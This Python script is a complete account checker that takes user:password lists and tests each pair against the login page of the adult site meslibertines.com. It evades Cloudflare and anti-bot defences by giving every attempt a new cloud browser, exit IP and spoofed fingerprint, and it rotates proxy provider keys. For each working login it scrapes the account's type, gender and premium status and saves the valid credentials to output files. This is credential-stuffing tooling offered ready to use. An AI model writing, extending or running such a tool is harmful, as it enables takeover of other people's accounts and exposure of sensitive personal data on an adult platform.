"""Check meslibertines.com accounts: which log in, and of what type.

Reads every ``user:password`` line under ``targets/`` and writes one verdict per
account under ``output/``. A rejected login is reported as ``password=false``;
a Cloudflare challenge that never clears is retried on a fresh session (new exit
IP) before being given up.

Reaching the site is what this is built around:

  * every attempt starts a brand-new cloud browser, and both Kernel and
    Browserbase hand out a different exit IP per session (verified);
  * Browserbase additionally gets a randomised fingerprint (screen size, viewport,
    colour scheme, French locale/timezone) so consecutive attempts do not share
    one;
  * every session is also given a fresh identity via hygiene.apply_identity (UA
    pinned to the real Chrome build, matching client hints, locale/timezone);
  * providers/keys are rotated between attempts, so a retry never reuses the IP
    that just failed. Every configured key stays in the fallback chain: an
    account starts on `key[slot]` (slot = its position, so the pool spreads
    over accounts) and falls back to the next key, then the other provider.

Credits are treated as scarce: a relaunch resumes and never re-tests an account
already resolved (``ok`` / ``password=false``), output is written after every
account so a Ctrl-C keeps the progress, and a wrong password stops at the first
session (no needless fallback). Only a transient block spends a second session.

Usage:
    python check_meslibertines.py                     # resume, fallback keys
    python check_meslibertines.py --concurrency 8     # accounts in parallel
    python check_meslibertines.py --tries 1           # strict minimum credits
    python check_meslibertines.py --redo              # re-test everything

Output files in ``output/`` (each starts with a pipe-separated header row):
    results.txt   mail:mdp|status|kind|type|label|premium|inscrit|last_seen|ip|provider|detail
    results.json  same rows, structured (drives the resume)
    valid.txt     mail:mdp|kind|type|label|premium|inscrit|last_seen   (status ok)
    invalids.txt  mail:mdp|cause|detail                               (status != ok)
    history.txt   append-only log of every verdict, never truncated
kind is membre | escort; type is the code f/m/c/t; premium is oui/non/"".
status is ok | password=false | challenge | noform | error.
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import json
import os
import random
import sys
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import httpx

import login_meslibertines as ML
import meslibertines_profile as mp
from config import load_dotenv, provider_keys
from hygiene import apply_identity
from transports import (
    BROWSERBASE_ROOT,
    KERNEL_ROOT,
    BrowserbaseTransport,
    KernelTransport,
    TransportError,
    open_browser,
)

ROOT = Path(__file__).resolve().parent
BASE_URL = "https://www.meslibertines.com"

# Kernel reached the login form on every session in testing, so it goes first;
# Browserbase is the fallback that also gives a fresh fingerprint.
PROVIDERS = ("kernel", "browserbase")
KEY_PREFIX = {"kernel": "KERNEL_API_KEY", "browserbase": "BROWSERBASE_API_KEY"}

# Screen sizes to rotate through. Kept plausible desktop values: a French adult
# site expects desktop traffic, not a 320px phone.
SCREENS = ((1366, 768), (1440, 900), (1536, 864), (1600, 900), (1680, 1050), (1920, 1080), (1280, 800))
LOCALES = ("fr-FR", "fr-FR", "fr-FR", "fr-BE", "fr-CH")  # mostly French, light variation
TIMEZONES = ("Europe/Paris", "Europe/Paris", "Europe/Brussels", "Europe/Zurich")

STATUS_OK = "ok"
STATUS_PASSWORD_FALSE = "password=false"
STATUS_CHALLENGE = "challenge"
STATUS_NOFORM = "noform"
STATUS_ERROR = "error"

# A definitive verdict never changes and is never re-paid on a relaunch. A
# different password for the same username is a different key, so it is retried.
DEFINITIVE_STATUSES = (STATUS_OK, STATUS_PASSWORD_FALSE)

# Shown when every provider key is out of credits/time or rejected. The run
# stops, progress is already on disk, and `{remaining}` accounts resume later.
NO_KEYS_MESSAGE = (
    "PLUS DE CREDIT / TEMPS PROXY : toutes les cles (kernel.sh, browserbase, ...) "
    "sont epuisees ou refusees. Progression sauvegardee -- {remaining} compte(s) "
    "non teste(s) seront repris au prochain lancement. Ajoute/remplace des cles "
    "dans .env puis relance la meme commande."
)


def read_targets(targets_dir: Path) -> list[tuple[str, str]]:
    """Every user:pass under targets/, deduped, order preserved."""
    accounts: list[tuple[str, str]] = []
    for path in sorted(targets_dir.glob("*")):
        if not path.is_file() or path.suffix not in (".txt", ".csv"):
            continue
        for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = raw.strip()
            if not line or line.startswith("#") or ":" not in line:
                continue
            user, _, password = line.partition(":")
            user, password = user.strip(), password.strip()
            if user and password and (user, password) not in accounts:
                accounts.append((user, password))
    return accounts


def pending_accounts(
    accounts: list[tuple[str, str]], previous: list[dict[str, str]], redo: bool = False
) -> list[tuple[str, str]]:
    """Accounts still worth testing.

    Keyed by the (user, password) couple, not by user: a refused couple is
    skipped, but the same username with a different password is kept. Only
    definitive verdicts are skipped; a `challenge` / `error` comes back.
    """
    if redo:
        return list(accounts)
    resolved = {
        (r["user"], r.get("password", ""))
        for r in previous
        if r.get("status") in DEFINITIVE_STATUSES
    }
    return [account for account in accounts if account not in resolved]


def available_keys() -> dict[str, list[str]]:
    return {name: provider_keys(KEY_PREFIX[name]) for name in PROVIDERS}


async def preflight(keys: dict[str, list[str]]) -> dict[str, list[str]]:
    """Drop dead keys before spending anything, and release orphan sessions.

    Kernel ``GET /browsers`` and Browserbase ``GET /v1/projects`` are free reads:
    they answer 200 on a live key and 401/403 on a disabled one, without opening
    a browser. Only those explicit auth failures remove a key; a network hiccup
    keeps it (a transient blip must not silently shrink the pool).

    Kernel caps concurrent sessions per org (observed limit=5). A hard kill does
    not run the release code, so stale sessions would keep occupying those slots
    and make every new session fail with 429. They are closed here, before any
    account is processed.
    """
    kept: dict[str, list[str]] = {}
    released = 0
    async with httpx.AsyncClient(timeout=20.0) as http:
        for provider, pool in keys.items():
            survivors: list[str] = []
            for key in pool:
                if provider == "kernel":
                    url, headers = f"{KERNEL_ROOT}/browsers", {"Authorization": f"Bearer {key}"}
                else:
                    url, headers = f"{BROWSERBASE_ROOT}/v1/projects", {"X-BB-API-Key": key}
                try:
                    response = await http.get(url, headers=headers)
                    if response.status_code == 200:
                        state = "VALIDE"
                        survivors.append(key)
                    elif response.status_code in (401, 403):
                        state = f"INVALIDE (HTTP {response.status_code})"
                    else:
                        state = f"KEEP (HTTP {response.status_code})"
                        survivors.append(key)
                except httpx.HTTPError as exc:
                    state = f"KEEP (reseau: {type(exc).__name__})"
                    survivors.append(key)
                print(f"  [preflight] {provider:11} ***{key[-6:]}: {state}")

                if provider == "kernel" and response.status_code == 200:
                    for session in response.json():
                        session_id = session.get("session_id")
                        if not session_id:
                            continue
                        with contextlib.suppress(httpx.HTTPError):
                            await http.delete(
                                f"{KERNEL_ROOT}/browsers/{session_id}",
                                headers={"Authorization": f"Bearer {key}"},
                            )
                            released += 1
            kept[provider] = survivors
    if released:
        print(f"  [preflight] {released} session(s) Kernel orpheline(s) liberee(s)")
    return kept


def random_session(provider: str) -> dict[str, Any]:
    """Provider-specific settings carrying a randomised fingerprint.

    The per-session identity itself comes from ``hygiene.apply_identity`` (shared
    by every entry point); this only seeds what the provider must set at
    session-creation time, which CDP cannot change afterwards.
    """
    width, height = random.choice(SCREENS)
    locale = random.choice(LOCALES)
    timezone = random.choice(TIMEZONES)
    viewport = {"width": width, "height": height}
    if provider == "browserbase":
        return {
            "fingerprint": {
                "screen": {"minWidth": width, "maxWidth": width, "minHeight": height, "maxHeight": height},
                "locale": locale,
                "languages": [locale, locale.split("-")[0], "en"],
                "timezone": timezone,
            },
            "viewport": viewport,
        }
    return {"locale": locale, "timezone": timezone}


def make_transport(provider: str, keys: list[str], settings: dict[str, Any]):
    if provider == "browserbase":
        return BrowserbaseTransport(keys, settings=settings)
    if provider == "kernel":
        return KernelTransport(keys, settings=settings)
    raise ValueError(provider)


async def exit_ip(browser: Any, context: Any) -> str:
    """Best-effort exit IP of the session, on a throwaway page."""
    page = None
    try:
        page = await context.new_page()
        await page.goto("https://api.ipify.org?format=json", wait_until="domcontentloaded", timeout=30_000)
        raw = (await page.inner_text("body")).strip()
        with contextlib.suppress(Exception):
            return json.loads(raw).get("ip", raw)
        return raw
    except Exception:
        return ""
    finally:
        if page is not None:
            with contextlib.suppress(Exception):
                await page.close()


async def own_gender(page: Any) -> str:
    """Gender code (m/f/c/t) the account declares on its own edit form.

    The public member profile sometimes has no reachable link or no ``Sexe:``
    line, but ``/member_dashes/edit_profile/`` always has the checked
    ``data[gender]`` radio, so this is the reliable source for a logged-in
    account.
    """
    with contextlib.suppress(Exception):
        await page.goto(
            BASE_URL + "/member_dashes/edit_profile/", wait_until="domcontentloaded", timeout=60_000
        )
        with contextlib.suppress(Exception):
            await page.wait_for_selector('input[name="data[gender]"]', timeout=8_000)
        value = await page.eval_on_selector('input[name="data[gender]"]:checked', "e => e.value")
        if value in ("m", "f", "c", "t"):
            return value
    return ""


async def check_once(
    user: str, password: str, provider: str, key: str, *, hygiene: bool = True
) -> dict[str, str]:
    settings = random_session(provider)
    transport = make_transport(provider, [key], settings)
    label = f"{provider}:***{key[-6:]}"
    result: dict[str, str] = {
        "user": user,
        "status": STATUS_ERROR,
        "kind": "",
        "type": "",
        "label": "",
        "premium": "",
        "jours_vip": "",
        "inscrit": "",
        "last_seen": "",
        "ip": "",
        "provider": label,
        "detail": "",
        "key_dead": "",
        "rate_limited": "",
    }
    try:
        async with open_browser(transport, key) as browser:
            context = browser.contexts[0] if browser.contexts else await browser.new_context()
            page = context.pages[0] if context.pages else await context.new_page()
            page.set_default_timeout(60_000)

            # A fresh per-session identity (UA pinned to the real build, client
            # hints, locale, timezone, tracker blocking) via the shared hygiene
            # routine. CDP can rewrite these on the existing page, so no fragile
            # context swap is needed.
            if hygiene:
                with contextlib.suppress(Exception):
                    identity = await apply_identity(browser)
                    result["detail"] = f"id={identity.get('platform','')}/{identity.get('locale','')}"

            result["ip"] = await exit_ip(browser, context)

            await page.goto(ML.LOGIN_URL, wait_until="domcontentloaded", timeout=120_000)
            if not await ML.clear_challenge(page, manual=False):
                result["status"] = STATUS_CHALLENGE
                return result

            # Make sure the form actually rendered before blaming the password.
            for _ in range(10):
                if await ML.find_username_field(page):
                    break
                await page.wait_for_timeout(1_000)
            else:
                result["status"] = STATUS_NOFORM
                return result

            if not await ML.attempt_login(page, user, password):
                result["status"] = STATUS_PASSWORD_FALSE
                # Back the verdict with the site's own words instead of only a
                # timeout: a real rejection prints an error, a stall does not.
                with contextlib.suppress(Exception):
                    body = (await page.inner_text("body")).lower()
                    if "invalide" in body or "incorrect" in body:
                        result["detail"] = "identifiants invalides (site)"
                return result

            result["status"] = STATUS_OK

            # Three natures land on three dashboards: a member on
            # /member_dashes/, an advertiser (escort) on /profiles/dash/, and a
            # multi-escort manager on /multi_dashes/ (no single gender). Member
            # and escort each link to a public profile whose "Sexe:" panel
            # carries the sub-type. Under concurrency the dashboard can render
            # slowly and hide the link, so the gather is retried once.
            landing = page.url or ""
            if "/profiles" in landing:
                kind, is_escort, is_multi = "escort", True, False
                dashboard = landing
            elif "/multi_dashes" in landing:
                kind, is_escort, is_multi = "multi", False, True
                dashboard = landing
            else:
                kind, is_escort, is_multi = "membre", False, False
                dashboard = BASE_URL + "/member_dashes/index/"
            result["kind"] = kind

            for attempt in range(2):
                await page.goto(dashboard, wait_until="domcontentloaded", timeout=60_000)
                await page.wait_for_timeout(2_000 if attempt == 0 else 2_500)
                if not result["premium"]:
                    with contextlib.suppress(Exception):
                        content = await page.content()
                        premium = mp.detect_premium(content)
                        result["premium"] = premium
                        # A paid package also states its end date / remaining
                        # days; only read it once premium itself is certain.
                        if premium == mp.PREMIUM_YES:
                            result["jours_vip"] = mp.detect_vip_days(content)
                if is_multi:
                    break  # a manager account has no single public profile

                hrefs = await page.eval_on_selector_all(
                    "a[href]", "els=>[...new Set(els.map(e=>e.getAttribute('href')))]"
                )
                if is_escort:
                    profile = next((h for h in hrefs if h and h.startswith("/escort/") and "annonce" not in h), "")
                else:
                    profile = next(
                        (
                            h
                            for h in hrefs
                            if h and h.startswith("/member/") and "dashes" not in h and "rankings" not in h
                        ),
                        "",
                    )

                if profile:
                    await page.goto(BASE_URL + profile, wait_until="domcontentloaded", timeout=60_000)
                    await page.wait_for_timeout(2_500)
                    parsed = mp.parse_profile(page.url, await page.inner_text("body"))
                    result["kind"] = result["kind"] or str(parsed.get("kind", ""))
                    if not result["type"]:
                        result["type"] = str(parsed.get("type", ""))
                        result["label"] = str(parsed.get("label", ""))
                    for field in ("inscrit", "last_seen"):
                        if not result[field]:
                            result[field] = str(parsed.get(field, ""))

                # A member's own edit form is the fallback when the public
                # profile did not carry the gender.
                if not is_escort and not result["type"]:
                    own = await own_gender(page)
                    if own:
                        result["type"] = own
                        result["label"] = mp.TYPE_LABELS.get(own, "")

                if result["type"] and (is_escort or result["inscrit"] or result["last_seen"]):
                    break
            return result
    except TransportError as exc:
        result["status"] = STATUS_ERROR
        result["detail"] = f"transport: {exc}"
        # Non-retryable = the key is out of credits or rejected: retire it so
        # the rest of the run does not keep paying for a dead key.
        result["key_dead"] = "" if exc.retryable else "1"
        # A 429 is the provider throttling the API, not a bad account: signal it
        # so the worker backs off instead of burning an attempt.
        if "429" in str(exc) or "rate limited" in str(exc).lower():
            result["rate_limited"] = "1"
        return result
    except Exception as exc:  # noqa: BLE001 - one account must not kill the run
        result["status"] = STATUS_ERROR
        result["detail"] = f"{type(exc).__name__}: {str(exc)[:160]}"
        return result


class KeyPool:
    """Live pool of provider keys, safe to share between concurrent workers.

    A key that answers 402/401 (out of credits or disabled) is discarded at
    runtime, so the run stops hammering it and can report when none are left.
    """

    def __init__(self, keys: dict[str, list[str]], providers: list[str]) -> None:
        self._keys = keys
        self._providers = providers
        self._lock = asyncio.Lock()
        self._pause_until = 0.0

    def ordered(self, slot: int) -> list[tuple[str, str]]:
        """Every (provider, key) starting at `slot`, kernel first, deduped."""
        out: list[tuple[str, str]] = []
        for name in self._providers:
            pool = self._keys.get(name) or []
            for offset in range(len(pool)):
                out.append((name, pool[(slot + offset) % len(pool)]))
        return out

    def any(self) -> bool:
        return any(self._keys.values())

    def counts(self) -> dict[str, int]:
        return {name: len(self._keys.get(name) or []) for name in self._providers}

    def penalize(self, seconds: float) -> None:
        """Pause all workers briefly after a provider 429 (shared cooldown)."""
        self._pause_until = max(self._pause_until, time.monotonic() + seconds)

    async def wait_ready(self) -> None:
        delay = self._pause_until - time.monotonic()
        if delay > 0:
            await asyncio.sleep(delay)

    async def discard(self, provider: str, key: str) -> None:
        async with self._lock:
            pool = self._keys.get(provider) or []
            if key in pool:
                pool.remove(key)


async def check_account(
    user: str,
    password: str,
    pool: KeyPool,
    tries: int,
    *,
    hygiene: bool = True,
    slot: int = 0,
) -> dict[str, str]:
    """Try up to `tries` fresh sessions.

    Keys are tried starting at `slot` (so workers spread over the pool), then
    the next key, then the other provider. A dead key is dropped from the pool
    immediately; if that empties the pool every later attempt stops at once.
    """
    last: dict[str, str] | None = None
    ordered = pool.ordered(slot)
    index = 0
    normal = 0
    extra = 0
    max_normal = max(1, tries)
    while index < len(ordered) and normal < max_normal:
        provider, key = ordered[index]
        await pool.wait_ready()
        result = await check_once(user, password, provider, key, hygiene=hygiene)
        if result["status"] in DEFINITIVE_STATUSES:
            return result
        # Provider throttling: back off and retry the same key without spending
        # an attempt (bounded, so a persistent 429 cannot loop forever).
        if result.get("rate_limited") and extra < 5:
            extra += 1
            pool.penalize(2.0)
            continue
        last = result
        if result.get("key_dead"):
            await pool.discard(provider, key)
            print(
                f"  cle {provider}:***{key[-6:]} epuisee/invalide, retiree du pool",
                file=sys.stderr,
                flush=True,
            )
        print(
            f"  [{user}] tentative {normal + 1} -> {result['status']} ({result['provider']}), fallback",
            file=sys.stderr,
            flush=True,
        )
        normal += 1
        index += 1
    if last is not None:
        return last
    return {
        "user": user, "status": STATUS_ERROR, "kind": "", "type": "", "label": "",
        "premium": "", "jours_vip": "", "inscrit": "", "last_seen": "", "ip": "", "provider": "",
        "detail": "plus aucune cle disponible", "key_dead": "1",
    }


def _atomic_write(path: Path, text: str) -> None:
    """Write via a temp file + replace, so an interrupt never truncates output."""
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(text, encoding="utf-8")
    tmp.replace(path)


def load_previous(output_dir: Path) -> list[dict[str, str]]:
    """Results from an earlier run, so a relaunch resumes instead of re-paying."""
    path = output_dir / "results.json"
    if not path.exists():
        return []
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return []
    return [r for r in data if isinstance(r, dict) and "user" in r and "status" in r]


# Column headers, written as the first line so a bare "non" (premium) is not
# mysterious. Pipe-separated, same shape as the data rows.
RESULTS_HEADER = "mail:mdp|status|kind|type|label|premium|jours_vip|inscrit|last_seen|ip|provider|detail"
VALID_HEADER = "mail:mdp|kind|type|label|premium|jours_vip|inscrit|last_seen"
INVALID_HEADER = "mail:mdp|cause|detail"
HISTORY_HEADER = "date|mail:mdp|status|kind|type|premium|jours_vip|ip|provider|detail"
# Only the paid advertisers: couple + observed package + remaining VIP days.
PREMIUM_HEADER = "mail:mdp|kind|type|label|premium|jours_vip"


def write_results(results: list[dict[str, str]], output_dir: Path) -> None:
    output_dir.mkdir(parents=True, exist_ok=True)
    results = sorted(results, key=lambda r: (r.get("user", ""), r.get("password", "")))
    full = [
        "|".join(
            [
                f"{r['user']}:{r.get('password', '')}",
                r["status"],
                r.get("kind", ""),
                r.get("type", ""),
                r.get("label", ""),
                r.get("premium", ""),
                r.get("jours_vip", ""),
                r.get("inscrit", ""),
                r.get("last_seen", ""),
                r.get("ip", ""),
                r.get("provider", ""),
                r.get("detail", ""),
            ]
        )
        for r in results
    ]
    # Comptes valides: couple + nature + type + premium + dates.
    valid = [
        "|".join(
            [
                f"{r['user']}:{r.get('password', '')}",
                r.get("kind", ""),
                r.get("type", ""),
                r.get("label", ""),
                r.get("premium", ""),
                r.get("jours_vip", ""),
                r.get("inscrit", ""),
                r.get("last_seen", ""),
            ]
        )
        for r in results
        if r["status"] == STATUS_OK
    ]
    # Comptes invalides: couple + cause (password=false, challenge, ...).
    invalids = [
        "|".join([f"{r['user']}:{r.get('password', '')}", r["status"], r.get("detail", "")])
        for r in results
        if r["status"] != STATUS_OK
    ]
    # Preuve du premium: uniquement les annonceurs dont un paquet est actif, avec
    # le nombre de jours VIP restants (0 = paquet epuise).
    premium = [
        "|".join(
            [
                f"{r['user']}:{r.get('password', '')}",
                r.get("kind", ""),
                r.get("type", ""),
                r.get("label", ""),
                r.get("premium", ""),
                r.get("jours_vip", ""),
            ]
        )
        for r in results
        if r["status"] == STATUS_OK and r.get("premium") == mp.PREMIUM_YES
    ]

    def blob(header: str, rows: list[str]) -> str:
        body = ("\n".join(rows) + "\n") if rows else ""
        return header + "\n" + body

    _atomic_write(output_dir / "results.txt", blob(RESULTS_HEADER, full))
    _atomic_write(output_dir / "results.json", json.dumps(results, indent=2, ensure_ascii=False))
    _atomic_write(output_dir / "valid.txt", blob(VALID_HEADER, valid))
    _atomic_write(output_dir / "invalids.txt", blob(INVALID_HEADER, invalids))
    _atomic_write(output_dir / "premium.txt", blob(PREMIUM_HEADER, premium))


def _normalize_history_row(line: str) -> str:
    """Upgrade any older history row to the current 10-field shape.

    Two earlier shapes exist: date|mail|status|type|ip|provider|detail (7
    fields, before kind/premium), and date|mail|status|kind|type|premium|
    ip|provider|detail (9 fields, before jours_vip). Fields added since are
    inserted empty, so a bare "non"/"oui" never shifts column.
    """
    parts = line.split("|")
    if len(parts) == 7:
        date, mail, status, typ, ip, prov, detail = parts
        return "|".join([date, mail, status, "", typ, "", "", ip, prov, detail])
    if len(parts) == 9:
        date, mail, status, kind, typ, premium, ip, prov, detail = parts
        return "|".join([date, mail, status, kind, typ, premium, "", ip, prov, detail])
    return line


def _pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    return True


def acquire_lock(output_dir: Path) -> Path | None:
    """Refuse to start if another live run owns the output dir.

    Two runs would fight over output/ and, worse, release each other's Kernel
    sessions. A stale lock from a crashed run is taken over silently.
    """
    output_dir.mkdir(parents=True, exist_ok=True)
    lock = output_dir / ".lock"
    if lock.exists():
        try:
            pid = int(lock.read_text(encoding="utf-8").strip())
        except (OSError, ValueError):
            pid = 0
        if pid and pid != os.getpid() and _pid_alive(pid):
            print(f"deja en cours (PID {pid}) : arrete-le avant de relancer", file=sys.stderr)
            return None
    lock.write_text(str(os.getpid()), encoding="utf-8")
    return lock


def ensure_history_header(output_dir: Path) -> Path:
    """Make history.txt exist, start with the header, and use one row shape."""
    output_dir.mkdir(parents=True, exist_ok=True)
    path = output_dir / "history.txt"
    if not path.exists() or path.stat().st_size == 0:
        path.write_text(HISTORY_HEADER + "\n", encoding="utf-8")
        return path
    current = path.read_text(encoding="utf-8")
    lines = current.splitlines()
    body = lines[1:] if lines and lines[0].strip() == HISTORY_HEADER else lines
    normalized = "\n".join([HISTORY_HEADER] + [_normalize_history_row(line) for line in body]) + "\n"
    if normalized != current:
        path.write_text(normalized, encoding="utf-8")
    return path


def append_history(result: dict[str, str], output_dir: Path) -> None:
    """Append-only trace of every verdict, across runs.

    results.txt / valid.txt / invalids.txt are regenerated from the merged set
    each run; this file is never truncated, so no earlier output can be lost.
    """
    path = ensure_history_header(output_dir)
    stamp = datetime.now(UTC).isoformat(timespec="seconds")
    line = "|".join(
        [
            stamp,
            f"{result['user']}:{result.get('password', '')}",
            result.get("status", ""),
            result.get("kind", ""),
            result.get("type", ""),
            result.get("premium", ""),
            result.get("jours_vip", ""),
            result.get("ip", ""),
            result.get("provider", ""),
            result.get("detail", ""),
        ]
    )
    with path.open("a", encoding="utf-8") as handle:
        handle.write(line + "\n")


async def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--targets", default=str(ROOT / "targets"))
    parser.add_argument("--output", default=str(ROOT / "output"))
    parser.add_argument(
        "--tries",
        type=int,
        default=2,
        help="sessions per account before giving up (fallback sur la clé suivante)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=0,
        help="comptes en parallele (defaut: min(nb de cles, 4); Kernel plafonne a 5 sessions)",
    )
    parser.add_argument("--order", default="kernel,browserbase", help="provider priority")
    parser.add_argument("--no-hygiene", action="store_true", help="disable per-session identity spoofing")
    parser.add_argument("--redo", action="store_true", help="ignore previous verdicts and re-test every account")
    parser.add_argument("--no-preflight", action="store_true", help="skip the free key validation")
    args = parser.parse_args()

    load_dotenv(str(ROOT / ".env"))
    providers = [p.strip() for p in args.order.split(",") if p.strip() in PROVIDERS]
    keys = available_keys()
    if not any(keys.values()):
        print("aucune cle provider dans .env", file=sys.stderr)
        return 2

    # Toujours valider les cles en amont: une cle morte ne doit pas etre payee.
    if not args.no_preflight:
        print("Preflight des cles (lectures gratuites, aucune session ouverte):")
        keys = await preflight(keys)
        live = sum(len(v) for v in keys.values())
        if not live:
            print("aucune cle valide apres preflight", file=sys.stderr)
            return 2

    accounts = read_targets(Path(args.targets))
    if not accounts:
        print(f"aucun compte dans {args.targets} (format user:pass)", file=sys.stderr)
        return 2

    output_dir = Path(args.output)
    lock = acquire_lock(output_dir)
    if lock is None:
        return 3
    ensure_history_header(output_dir)
    # Reprise: un compte deja resolu (ok / password=false) n'est jamais repaye.
    # La cle est le couple (user, password): un autre mot de passe pour le meme
    # pseudo est bien retente.
    results = load_previous(output_dir)
    todo = pending_accounts(accounts, results, redo=args.redo)
    skipped = len(accounts) - len(todo)

    pool = KeyPool(keys, providers)
    live_keys = sum(pool.counts().values())
    concurrency = args.concurrency or min(live_keys, 4)
    concurrency = max(1, min(concurrency, live_keys or 1, len(todo) or 1))

    print(
        f"{len(accounts)} compte(s); a tester={len(todo)} deja resolus={skipped}; "
        f"providers={providers}; cles kernel={len(keys['kernel'])} browserbase={len(keys['browserbase'])}; "
        f"concurrence={concurrency}"
    )

    if not todo:
        write_results(results, output_dir)
        lock.unlink(missing_ok=True)
        print(f"\necrit -> {output_dir}/valid.txt / invalids.txt / results.txt / history.txt")
        return 0

    lock = asyncio.Lock()
    queue: asyncio.Queue = asyncio.Queue()
    for account in todo:
        queue.put_nowait(account)

    async def worker(wid: int) -> None:
        while pool.any():
            try:
                user, password = queue.get_nowait()
            except asyncio.QueueEmpty:
                return
            await pool.wait_ready()
            try:
                result = await check_account(
                    user, password, pool, max(1, args.tries), hygiene=not args.no_hygiene, slot=wid
                )
            except Exception as exc:  # noqa: BLE001 - one account must not kill the run
                result = {
                    "user": user, "status": STATUS_ERROR, "kind": "", "type": "", "label": "",
                    "premium": "", "jours_vip": "", "inscrit": "", "last_seen": "", "ip": "", "provider": "",
                    "detail": f"{type(exc).__name__}: {str(exc)[:120]}", "key_dead": "",
                }
            result["password"] = password
            async with lock:
                results[:] = [r for r in results if (r["user"], r.get("password", "")) != (user, password)]
                results.append(result)
                # Ecriture apres chaque compte: un arret conserve la progression.
                write_results(results, output_dir)
                append_history(result, output_dir)
                print(
                    f"[{len(todo) - queue.qsize()}/{len(todo)}] {result['status']} {user} "
                    f"kind={result.get('kind', '')} type={result.get('type', '')} "
                    f"premium={result.get('premium', '')} ip={result.get('ip', '')}",
                    flush=True,
                )

    await asyncio.gather(*(worker(i) for i in range(concurrency)))

    write_results(results, output_dir)
    lock.unlink(missing_ok=True)
    remaining = queue.qsize()
    if not pool.any():
        print("\n" + NO_KEYS_MESSAGE.format(remaining=remaining))
    elif remaining:
        print(f"\nInterrompu: {remaining} compte(s) non teste(s). Relance pour reprendre.")
    print(f"ecrit -> {output_dir}/valid.txt / invalids.txt / results.txt / history.txt")
    ok = sum(1 for r in results if r["status"] == STATUS_OK)
    bad = sum(1 for r in results if r["status"] == STATUS_PASSWORD_FALSE)
    other = len(results) - ok - bad
    print(f"ok={ok} password=false={bad} autres={other} total={len(results)}")
    return 0


if __name__ == "__main__":
    with contextlib.suppress(KeyboardInterrupt):
        sys.exit(asyncio.run(main()))
